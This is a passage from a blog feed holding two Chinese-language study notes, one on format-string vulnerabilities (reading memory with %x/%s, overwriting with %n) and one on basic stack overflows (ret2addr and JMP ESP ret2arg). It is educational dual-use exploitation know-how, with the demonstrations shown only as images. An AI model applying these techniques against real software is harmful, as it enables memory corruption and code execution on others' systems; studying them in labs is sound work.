就一定可以找到这个AAAA的位置。我们将这个位置记下来，实例中就是第七个%x的位置，即第7个参数。</p><p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br>%&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/10.png" alt=""></p><p>图中是第六个参数是41414141。</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/11.png" alt=""></p><p>同样可以得到41414141。这样就方便的多了。</p><h4 id="读取内存"><a href="#读取内存" class="headerlink" title="读取内存"></a>读取内存</h4><p>有了上面内容的铺垫就可以学任意读取了：<br>看下面的代码：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/12.png" alt=""></p><p>从命令行输入字符串后，将该字符串复制到a内，再直接打印a；<br>输入的字符串的前4个字节如果是一个有效的字符串的首地址，就可以用%s将其打印出来，做到任意内存读取。如果不是有效的字符串，会出现段错误。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/13.png" alt=""></p><p><strong>如何写入地址，需要用到linux自带的printf命令，将shellcode编码转义为字符</strong>。（注意用反引号将printf命令括住，反引号在Tab键的上面，反引号内的内容会被当做命令执行。）<br><strong>如果是用scanf输入字符串，则无法使用printf命令，只能对照ascii码表，scanf和命令行输入的shellcode编码不能直接被转义。（所以为了方便演示，后面都使用了命令行输入参数）</strong><br>写入地址实例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/14.png" alt=""></p><p>0x41414141这个地址已经成功写入内存，下面只需用%s读取对应位置，就能读取以0x41414141为首地址的字符串。<br>如果用%n就能将0x41414141这个地址指向的值修改，就能造成任意内存的修改，可以将栈中返回地址修改为想要执行的shellcode的首地址等等。</p><h4 id="修改内存"><a href="#修改内存" class="headerlink" title="修改内存"></a>修改内存</h4><p>下面写个修改静态变量的例子<br>例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/15.png" alt=""></p><p>测试前，请先关闭内存地址随机化（PIE），否者b在内存中的地址是不确定的。<br>先运行下，得到b的地址<br><img src="/2019/02/11/基本格式化字符串漏洞原理/16.png" alt=""></p><p>接着确定偏移量<br><img src="/2019/02/11/基本格式化字符串漏洞原理/17.png" alt=""></p><p>这里是第九个参数。<br>接着用shellcode编码将b的地址写入，并查看能否写入成功。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/18.png" alt=""><br>用%n修改其值。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/19.png" alt=""><br>因为%n之前打印了75个字符，所以这里将b的值从0修改为75<br><strong>你也可以通过%&lt; number &gt;$n 来直接修改第九个参数来修改b的值</strong>。注意在命令行输入字符串参数时，要用 “ \ “将 $ 转义，例如：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/20.png" alt=""></p><p>在%n之前打印了4个字符，所以b的值直接被修改为4了。<br>你可以通过控制打印的字符个数来修改b的值，达到几乎任意修改。<br>例如%0xxxxxd，通过打印数字前面补0，进行简化。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;理解这个漏洞的原理，你需要有汇编层面的函数调用和函数的参数传递知识。如果你不清楚函数的参数是如何传递的，可以看《加密与解密》的逆向分析技术篇。&lt;/p&gt;
&lt;p&gt;再说格式化字符串漏洞之前，先了解一下printf函数和利用该漏洞的重要 格式化字符串%n，利用他可以做到几乎任意内存
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基本栈溢出</title>
    <link href="http://yoursite.com/2019/02/11/%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://yoursite.com/2019/02/11/基本栈溢出/</id>
    <published>2019-02-11T08:27:06.000Z</published>
    <updated>2019-02-11T08:36:10.087Z</updated>
    
    <content type="html"><![CDATA[<p>ret2addr和ret2arg这两种利用手法在《黑手缓冲区溢出教程》里有所提及。这两种只是基本的利用手法，如果开启了NX（堆栈代码不可执行）或者ASLR就无用武之地了，需要更高级的利用手法，例如ret2libc，ret2plt，和ROP等高级利用手法，这篇笔记就只说下基本的利用手法及漏洞原理。</p><p>了解栈溢出漏洞，需要对汇编里的call指令（相当于push eip和jmp 函数首地址 ），ret指令（相当于pop eip），函数的调用过程有所了解。《加密与解密》的逆向分析技术篇中函数部分说的很清楚。下面也会有所介绍。</p><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h5><p>栈溢出是向栈中写入超过原本长度限制的数据，使栈中的其他数据被覆盖，常见的是覆盖栈中返回地址，改变程序的执行流程。<br>栈溢出漏洞成立需要两个条件，其一是：有向栈中写入数据的行为，另一个是：使用了gets，strcpy，strcat等 不限制数据输入长度或者不检查数组长度的函数。</p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a><strong>预备知识</strong></h4><p>函数的调用和返回等过程都是在栈中完成的，栈中也保存着局部变量和函数的参数。<br>说之前先复习下函数调用的知识。<br>调用函数前，如果函数有参数，需要先将参数传入栈中（值传递本质是将变量复制一份压入堆栈，而地址传递，是将变量的地址直接压入栈中，通过加上中括号[]，直接访问）<br><strong>一般情况下参数的入栈是从右往左依次入栈的（cdecl调用约定，stdcall，fastcall等）。</strong><br>值传递模板（非fastcall调用约定，fastcall调用约定前两个参数会直接用寄存器，不用堆栈，后面的参数仍然用堆栈传参）如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,dword ptr [EBP-xxx]  //push 后无法直接接内存单元,需要先传给寄存器</span><br><span class="line">push eax //压入堆栈传参</span><br><span class="line">mov eax，dword ptr [xxx]</span><br><span class="line">push eax</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>传完参数后会call 函数（call 会将调用函数即母函数的call指令的下一条要执行的指令的地址压入堆栈，然后再跳转到函数代码段的首地址，这和cpu执行指令的过程有关，cpu执行指令的过程如下：1。读取EIP指向的指令，将其放入指令缓冲器，2。EIP指向下一条指令，3。执行指令缓冲器里的指令，然后返回 1。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 函数代码首地址</span><br></pre></td></tr></table></figure><p>函数内容有个模板（下面为debug版，release版会有所不同）如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">//这里提升堆栈</span><br><span class="line">sub esp,0x40  </span><br><span class="line">//这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同（会根据你所用的变量的多少和大小来开辟）。</span><br><span class="line">push edi</span><br><span class="line">push esi</span><br><span class="line">push ebx</span><br><span class="line">//保留现场</span><br><span class="line">lea edi, dword ptr ss:[ebp-0x40]</span><br><span class="line">mov ecx,0x10</span><br><span class="line">mov eax,0xcccccccc</span><br><span class="line">rep stos dowrd ptr es:[edi]</span><br><span class="line">//填充缓冲区（清除垃圾数据），用于存放局部变量</span><br><span class="line">----------------</span><br><span class="line">这里是写函数的功能</span><br><span class="line">----------------</span><br><span class="line">    pop ebx</span><br><span class="line">    pop esi</span><br><span class="line">    pop edi</span><br><span class="line">    //恢复现场</span><br><span class="line">    mov esp,ebp</span><br><span class="line">    pop ebp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>执行完call函数后的堆栈图如下（下面是高址，上面是低址）：<br><img src="/2019/02/11/基本栈溢出/1.png" alt=""></p><p>此时，EBP的位置就很关键了，使用EBP+xxx，可以访问到传入栈中的参数，向上EBP-xxx，可以访问局部变量。<br>当函数的代码执行到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp，ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>此时ESP指向栈中的返回地址，执行ret执行（相当于pop eip）后就会将返回地址赋值给EIP，函数就执行完毕了，此时EIP重新指向母函数。</p><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h5><p>漏洞的关键就是利用gets，strcpy，strcat 等函数，<strong>输入或者拼接超过字符数组原先规定的长度的字符串</strong>。<br>例如原先定义的字符数组 a[8]，你使用gets函数，输入了”AAAAAAAAAAAABBBB”,原先编译器编译成汇编时并没有预留足够的空间，例如前面函数模板中的 <code>sub esp，0x40</code>，他只开辟了0x40的空间，那么多输入的字符串就会将堆栈中的其他内容覆盖掉。<br>调用gets前的堆栈图如下：<br><img src="/2019/02/11/基本栈溢出/2.png" alt=""></p><p>调用gets，输入”AAAAAAAAAAAABBBB”后的堆栈图如下：<br><img src="/2019/02/11/基本栈溢出/3.png" alt=""></p><p>起始EBP值，和返回地址以及后面的堆栈空间都可以被输入的字符串所覆盖，这就是缓冲区溢出漏洞。</p><p><strong>基本利用之ret2addr</strong><br>ret2addr就是 return to address ，就是将堆栈里的返回地址覆盖为你所编写的shellcode的首地址上，ret2addr特指的是缓冲区里的shellcode。<br>利用缓冲区溢出后的堆栈图如下：<br><img src="/2019/02/11/基本栈溢出/4.png" alt=""></p><p>当ret后 ，EIP就会指向shellcode的首地址，这样就能执行你的shellcode了。如何找到shellcode的首地址，在下篇笔记再提及。</p><p><strong>基本利用之ret2arg</strong><br>与ret2addr不同的之处是 shellcode在返回地址的下面，而不是在栈帧里。同时返回地址被覆盖为JMP ESP这个指令的首地址。利用后的堆栈图如下：<br><img src="/2019/02/11/基本栈溢出/5.png" alt=""></p><p>原来的返回地址被覆盖为JMP ESP指令的首地址。<br>因为<strong>ret后 ，ESP加4</strong>，则此时ESP指向shellcode的首地址，而EIP指向了JMP ESP指令的首地址，执行JMP ESP后，EIP就指向了shellcode的首地址，这样就会执行你的shellcode了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ret2addr和ret2arg这两种利用手法在《黑手缓冲区溢出教程》里有所提及。这两种只是基本的利用手法，如果开启了NX（堆栈代码不可执行）或者ASLR就无用武之地了，需要更高级的利用手法，例如ret2libc，ret2plt，和ROP等高级利用手法，这篇笔记就只说下基本
      
    
    </summary>
    
    
  </entry>
  
</feed>
